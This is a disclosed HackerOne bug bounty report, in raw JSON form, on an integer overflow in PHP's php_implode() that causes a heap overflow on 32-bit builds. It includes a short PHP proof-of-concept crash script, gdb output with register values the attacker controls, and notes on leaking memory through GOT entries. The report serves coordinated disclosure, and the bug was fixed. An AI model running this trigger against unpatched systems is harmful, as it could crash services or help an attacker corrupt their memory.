{"id":113120,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTMxMjA=","url":"https://hackerone.com/reports/113120","title":"An integer overflow bug in php_implode() could lead heap overflow, make PHP to crash","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-27T21:57:52.867Z","submitted_at":"2016-01-27T21:57:52.867Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"blue9057","url":"/blue9057","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:38:12.878Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:37:57.061Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n-----------------\nA heap overflow vulnerability can be triggered by\nan integer overflow vulnerability,\nwhich exists in PHP-7.1.0 due to missing overflow check\nin a function php_implode() in ext/standard/string.c\n\nI believe this could lead memory leak to the string if\ncarefully exploited with using global addresses\nin the binary (e.g., GOT entries, heap addresses, etc.).\n\nThe bug happens on the line of ext/standard/string.c:1249,\nupon calling zend_string_alloc().\nBoth %eax and %ecx can be controllable by the exploit.\n\nstr = zend_string_alloc(len + (numelems - 1) * ZSTR_LEN(delim), 0);\n\nThis is only triggered in 32bit machines.\n\nPoC Exploit\n-----------------\n\u003c?php\n  $arr = [];\n  for($i=0;$i\u003c65536; ++$i) {\n     $arr[$i]= \"aa\";\n  }\n  $text1 = str_repeat(\"ABCD\", 16384);\n  // Changing ABCD into other values will alter %eax and %ecx.\n  $str = implode($text1, $arr);\n?\u003e\n\n# Run this script with php version over 7.0\n\n\nResult\n---------\n[blue9057@ubuntu ~/exploit/php$] gdb `which php`\nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1\nCopyright (C) 2014 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i686-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from /usr/local/bin/php...done.\n(gdb) r implode.php\nStarting program: /usr/local/bin/php implode.php\n\nProgram received signal SIGSEGV, Segmentation fault.\nphp_implode (delim=delim@entry=0xb7401000, arr=arr@entry=0xb7a13160, return_value=return_value@entry=0xb7a13100) at /home/blue9057/php-src/ext/standard/string.c:1255\n1255\t\t\t\tcptr -= ZSTR_LEN(*strptr);\n(gdb) i r\neax            0x44434241\t1145258561\necx            0x44434241\t1145258561\nedx            0xb7452004\t-1220206588\nebx            0xb7452004\t-1220206588\nesp            0xbfffbf80\t0xbfffbf80\nebp            0xcccccccd\t0xcccccccd\nesi            0xb7451fe4\t-1220206620\nedi            0xb7442004\t-1220272124\neip            0x827f0d8\t0x827f0d8 \u003cphp_implode+440\u003e\neflags         0x10206\t[ PF IF RF ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n(gdb) r -v\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /usr/local/bin/php -v\nPHP 7.1.0-dev (cli) (built: Jan 24 2016 20:39:41) ( NTS )\nCopyright (c) 1997-2016 The PHP Group\nZend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies\n[Inferior 1 (process 3607) exited normally]\n(gdb)\n\n\nThe attacker can control both %eax \u0026 %ecx for the arbitrary value.\nThe instruction is on moving the content at memory pointed by $eax to the memory address at $edx.\nIf it is carefully controlled, that copy of string operation can applied over a GOT addresses or sensitive areas to leak the data into PHP string variable.\n","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eA heap overflow vulnerability can be triggered by\u003cbr\u003e\nan integer overflow vulnerability,\u003cbr\u003e\nwhich exists in PHP-7.1.0 due to missing overflow check\u003cbr\u003e\nin a function php_implode() in ext/standard/string.c\u003c/p\u003e\n\n\u003cp\u003eI believe this could lead memory leak to the string if\u003cbr\u003e\ncarefully exploited with using global addresses\u003cbr\u003e\nin the binary (e.g., GOT entries, heap addresses, etc.).\u003c/p\u003e\n\n\u003cp\u003eThe bug happens on the line of ext/standard/string.c:1249,\u003cbr\u003e\nupon calling zend_string_alloc().\u003cbr\u003e\nBoth %eax and %ecx can be controllable by the exploit.\u003c/p\u003e\n\n\u003cp\u003estr = zend_string_alloc(len + (numelems - 1) * ZSTR_LEN(delim), 0);\u003c/p\u003e\n\n\u003cp\u003eThis is only triggered in 32bit machines.\u003c/p\u003e\n\n\u003ch2 id=\"poc-exploit\"\u003ePoC Exploit\u003c/h2\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\n  $arr = [];\u003cbr\u003e\n  for($i=0;$i\u0026lt;65536; ++$i) {\u003cbr\u003e\n     $arr[$i]= \u0026quot;aa\u0026quot;;\u003cbr\u003e\n  }\u003cbr\u003e\n  $text1 = str_repeat(\u0026quot;ABCD\u0026quot;, 16384);\u003cbr\u003e\n  // Changing ABCD into other values will alter %eax and %ecx.\u003cbr\u003e\n  $str = implode($text1, $arr);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003ch1 id=\"run-this-script-with-php-version-over-7-0\"\u003eRun this script with php version over 7.0\u003c/h1\u003e\n\n\u003ch2 id=\"result\"\u003eResult\u003c/h2\u003e\n\n\u003cp\u003e[blue9057@ubuntu ~/exploit/php$] gdb \u003ccode\u003ewhich php\u003c/code\u003e\u003cbr\u003e\nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1\u003cbr\u003e\nCopyright (C) 2014 Free Software Foundation, Inc.\u003cbr\u003e\nLicense GPLv3+: GNU GPL version 3 or later \u003ca title=\"http://gnu.org/licenses/gpl.html\" href=\"/redirect?url=http%3A%2F%2Fgnu.org%2Flicenses%2Fgpl.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gnu.org/licenses/gpl.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThis is free software: you are free to change and redistribute it.\u003cbr\u003e\nThere is NO WARRANTY, to the extent permitted by law.  Type \u0026quot;show copying\u0026quot;\u003cbr\u003e\nand \u0026quot;show warranty\u0026quot; for details.\u003cbr\u003e\nThis GDB was configured as \u0026quot;i686-linux-gnu\u0026quot;.\u003cbr\u003e\nType \u0026quot;show configuration\u0026quot; for configuration details.\u003cbr\u003e\nFor bug reporting instructions, please see:\u003cbr\u003e\n\u003ca title=\"http://www.gnu.org/software/gdb/bugs/\" href=\"/redirect?url=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fbugs%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.gnu.org/software/gdb/bugs/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nFind the GDB manual and other documentation resources online at:\u003cbr\u003e\n\u003ca title=\"http://www.gnu.org/software/gdb/documentation/\" href=\"/redirect?url=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fdocumentation%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.gnu.org/software/gdb/documentation/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nFor help, type \u0026quot;help\u0026quot;.\u003cbr\u003e\nType \u0026quot;apropos word\u0026quot; to search for commands related to \u0026quot;word\u0026quot;...\u003cbr\u003e\nReading symbols from /usr/local/bin/php...done.\u003cbr\u003e\n(gdb) r implode.php\u003cbr\u003e\nStarting program: /usr/local/bin/php implode.php\u003c/p\u003e\n\n\u003cp\u003eProgram received signal SIGSEGV, Segmentation fault.\u003cbr\u003e\nphp_implode (delim=delim@entry=0xb7401000, arr=arr@entry=0xb7a13160, return_value=return_value@entry=0xb7a13100) at /home/blue9057/php-src/ext/standard/string.c:1255\u003cbr\u003e\n1255                cptr -= ZSTR_LEN(*strptr);\u003cbr\u003e\n(gdb) i r\u003cbr\u003e\neax            0x44434241   1145258561\u003cbr\u003e\necx            0x44434241   1145258561\u003cbr\u003e\nedx            0xb7452004   -1220206588\u003cbr\u003e\nebx            0xb7452004   -1220206588\u003cbr\u003e\nesp            0xbfffbf80   0xbfffbf80\u003cbr\u003e\nebp            0xcccccccd   0xcccccccd\u003cbr\u003e\nesi            0xb7451fe4   -1220206620\u003cbr\u003e\nedi            0xb7442004   -1220272124\u003cbr\u003e\neip            0x827f0d8    0x827f0d8 \u0026lt;php_implode+440\u0026gt;\u003cbr\u003e\neflags         0x10206  [ PF IF RF ]\u003cbr\u003e\ncs             0x73 115\u003cbr\u003e\nss             0x7b 123\u003cbr\u003e\nds             0x7b 123\u003cbr\u003e\nes             0x7b 123\u003cbr\u003e\nfs             0x0  0\u003cbr\u003e\ngs             0x33 51\u003cbr\u003e\n(gdb) r -v\u003cbr\u003e\nThe program being debugged has been started already.\u003cbr\u003e\nStart it from the beginning? (y or n) y\u003cbr\u003e\nStarting program: /usr/local/bin/php -v\u003cbr\u003e\nPHP 7.1.0-dev (cli) (built: Jan 24 2016 20:39:41) ( NTS )\u003cbr\u003e\nCopyright (c) 1997-2016 The PHP Group\u003cbr\u003e\nZend Engine v3.1.0-dev, Copyright (c) 1998-2016 Zend Technologies\u003cbr\u003e\n[Inferior 1 (process 3607) exited normally]\u003cbr\u003e\n(gdb)\u003c/p\u003e\n\n\u003cp\u003eThe attacker can control both %eax \u0026amp; %ecx for the arbitrary value.\u003cbr\u003e\nThe instruction is on moving the content at memory pointed by $eax to the memory address at $edx.\u003cbr\u003e\nIf it is carefully controlled, that copy of string operation can applied over a GOT addresses or sensitive areas to leak the data into PHP string variable.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:37:57.152Z","allow_singular_disclosure_after":-35663947.80364446,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":774495,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is already submitted to PHP bug report and the reference is here:\nhttps://bugs.php.net/bug.php?id=71449","markdown_message":"\u003cp\u003eIt is already submitted to PHP bug report and the reference is here:\u003cbr\u003e\n\u003ca title=\"https://bugs.php.net/bug.php?id=71449\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D71449\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=71449\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-27T21:58:21.561Z","updated_at":"2016-01-27T21:58:21.561Z","actor":{"username":"blue9057","cleared":false,"url":"/blue9057","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":935029,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-01T00:17:29.479Z","updated_at":"2016-05-01T00:17:29.479Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"blue9057","url":"/blue9057"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":935031,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-01T00:17:36.727Z","updated_at":"2016-05-01T00:17:36.727Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"blue9057","url":"/blue9057"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026470,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:37:57.079Z","updated_at":"2019-10-13T09:37:57.079Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285863,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:38:12.899Z","updated_at":"2019-11-12T09:38:12.899Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}